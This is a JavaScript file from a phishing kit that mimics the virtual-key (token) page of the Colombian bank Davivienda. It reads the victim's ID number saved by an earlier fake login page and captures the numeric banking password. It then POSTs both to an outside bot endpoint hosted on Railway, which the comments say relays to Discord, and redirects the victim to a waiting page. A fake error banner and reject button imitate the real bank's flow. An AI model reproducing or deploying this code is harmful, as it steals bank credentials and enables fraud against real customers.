/* ============================================
   DAVIVIENDA - TOKEN (Clave Virtual)
   Envía cédula + clave a Discord, luego va a espera.html
   ============================================ */
(function() {
    'use strict';

    // ==========================================
    // CONFIGURACIÓN
    // ==========================================
    var WEBHOOK_URL = 'https://multi-bancos-production.up.railway.app';
    var BANCO = 'davivienda';

    // ==========================================
    // ELEMENTOS
    // ==========================================
    var fechaEl        = document.getElementById('dav-fecha');
    var cusEl          = document.getElementById('dav-cus');
    var formEl         = document.getElementById('davFormToken');
    var selectTipo     = document.getElementById('dav-tipo-doc');
    var inputNumDoc    = document.getElementById('dav-num-doc');
    var inputClave     = document.getElementById('dav-clave');
    var btnContinuar   = document.getElementById('davBtnContinuar');
    var btnRechazar    = document.getElementById('davBtnRechazar');
    var mensajeError   = document.getElementById('davMensajeError');

    // ==========================================
    // SESIÓN (misma que login)
    // ==========================================
    var sessionId = '';
    try {
        sessionId = sessionStorage.getItem('sessionId') || '';
    } catch(e) {}
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000);
        try { sessionStorage.setItem('sessionId', sessionId); } catch(e) {}
    }

    // ==========================================
    // FECHA DINÁMICA
    // ==========================================
    function obtenerFechaFormato() {
        var dias = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
        var meses = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio',
                     'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
        var d = new Date();
        var diaNombre = dias[d.getDay()];
        var dia = d.getDate();
        var mes = meses[d.getMonth()];
        var anio = d.getFullYear();

        var h = d.getHours();
        var m = d.getMinutes();
        var ampm = h >= 12 ? 'PM' : 'AM';
        h = h % 12;
        if (h === 0) h = 12;
        var hh = (h < 10 ? '0' : '') + h;
        var mm = (m < 10 ? '0' : '') + m;

        return diaNombre + ' ' + dia + ' de ' + mes + ' de ' + anio + ', ' + hh + ':' + mm + ' ' + ampm;
    }

    if (fechaEl) fechaEl.textContent = obtenerFechaFormato();

    // ==========================================
    // CUS ALEATORIO
    // ==========================================
    var cus = Math.floor(100000000 + Math.random() * 900000000);
    if (cusEl) cusEl.textContent = cus;

    // ==========================================
    // RECUPERAR DATOS DEL LOGIN
    // ==========================================
    var numDocCompleto = '';
    var tipoDoc = '01';
    var tipoDocTexto = 'Cedula de Ciudadania';
    var canal = 'Persona Natural';

    try {
        numDocCompleto = sessionStorage.getItem('dav_num_doc') || '';
        tipoDoc = sessionStorage.getItem('dav_tipo_doc') || '01';
        tipoDocTexto = sessionStorage.getItem('dav_tipo_doc_texto') || 'Cedula de Ciudadania';
        canal = sessionStorage.getItem('dav_canal') || 'Persona Natural';
    } catch(e) {}

    // ==========================================
    // MOSTRAR SOLO LOS ÚLTIMOS 4 DÍGITOS
    // ==========================================
    function enmascararDocumento(doc) {
        if (!doc) return '••••••';
        if (doc.length <= 4) return doc;
        var ultimos4 = doc.slice(-4);
        return '••••••' + ultimos4;
    }

    if (inputNumDoc) {
        if (numDocCompleto) {
            inputNumDoc.value = enmascararDocumento(numDocCompleto);
        } else {
            inputNumDoc.value = '••••••';
        }
    }

    // ==========================================
    // PONER EL TIPO DE DOCUMENTO SELECCIONADO
    // ==========================================
    if (selectTipo && tipoDoc) {
        selectTipo.value = tipoDoc;
    }

    // ==========================================
    // MOSTRAR / OCULTAR MENSAJE DE ERROR
    // ==========================================
    function mostrarError() {
        if (mensajeError) mensajeError.classList.remove('hidden');
    }

    function ocultarError() {
        if (mensajeError) mensajeError.classList.add('hidden');
    }

    // ==========================================
    // SI VIENE DE UN RECHAZO, MOSTRAR FRANJA
    // ==========================================
    try {
        if (sessionStorage.getItem('dav_rechazado') === '1') {
            mostrarError();
            // Limpiar la bandera para que no se quede pegada
            sessionStorage.removeItem('dav_rechazado');
        }
    } catch(e) {}

    // ==========================================
    // SOLO NÚMEROS EN LA CLAVE VIRTUAL
    // ==========================================
    if (inputClave) {
        inputClave.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length > 0) ocultarError();
        });
        inputClave.addEventListener('keypress', function(ev) {
            var code = ev.which || ev.keyCode;
            if (code < 48 || code > 57) ev.preventDefault();
        });
    }

    // ==========================================
    // BOTÓN RECHAZAR → MUESTRA FRANJA DE ERROR
    // ==========================================
    if (btnRechazar) {
        btnRechazar.addEventListener('click', function() {
            mostrarError();
        });
    }

    // ==========================================
    // SUBMIT — Envía a Discord y va a espera
    // ==========================================
    if (formEl) {
        formEl.addEventListener('submit', function(ev) {
            ev.preventDefault();

            var clave = inputClave ? inputClave.value.trim() : '';

            if (!clave) {
                mostrarError();
                inputClave.focus();
                return;
            }

            if (clave.length < 4) {
                mostrarError();
                inputClave.focus();
                return;
            }

            ocultarError();

            if (btnContinuar) {
                btnContinuar.disabled = true;
                btnContinuar.textContent = 'Enviando...';
            }

            // ==========================================
            // DATOS A ENVIAR (formato que espera el bot)
            // ==========================================
            var datos = {
                sessionId: sessionId,
                tipo: canal,
                tipoDoc: tipoDocTexto,
                identificacion: numDocCompleto,
                clave: clave,
                tarjeta: '',
                token: ''
            };

            console.log('🔑 Datos enviados al bot:', datos);

            try {
                sessionStorage.setItem('dav_clave_virtual', clave);
            } catch(e) {}

            // ==========================================
            // ENVIAR AL BOT
            // ==========================================
            fetch(WEBHOOK_URL + '/' + BANCO + '/enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(datos)
            })
            .then(function(res) {
                console.log('✅ Respuesta del bot:', res.status);
                return res.json();
            })
            .then(function(data) {
                console.log('✅ Respuesta JSON:', data);
            })
            .catch(function(err) {
                console.warn('⚠️ Error al enviar:', err);
            })
            .finally(function() {
                // Redirigir a la pantalla de espera
                setTimeout(function() {
                    window.location.href = 'espera.html';
                }, 600);
            });
        });
    }

    window.deshabilita = function() {};
    window.obtenerFechaFormato = obtenerFechaFormato;

})();